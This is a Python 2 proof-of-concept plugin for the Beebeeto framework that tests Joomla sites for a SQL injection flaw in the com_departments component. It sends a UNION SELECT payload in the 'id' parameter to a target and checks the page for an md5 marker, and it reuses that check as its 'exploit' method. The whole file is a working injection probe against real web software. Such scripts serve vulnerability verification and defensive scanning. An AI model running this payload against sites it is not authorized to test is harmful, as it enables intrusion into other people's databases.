#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0170',
            'name': 'Joomla Component com_departments插件 SQL注入漏洞 POC',
            'author': '1024',
            'create_date': '2014-11-30',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Joomla',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['Joomla漏洞', 'SQL注入漏洞', 'com_departments', 'php'],
            'desc': 'N/A',
            'references': ['http://sebug.net/vuldb/ssvid-19358',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = "/index.php?option=com_departments&id=-1 UNION SELECT 1,md5(666),3,4,5,6,7,8--"
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'fae0b27c451c728867a567e8c1bb4e53' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())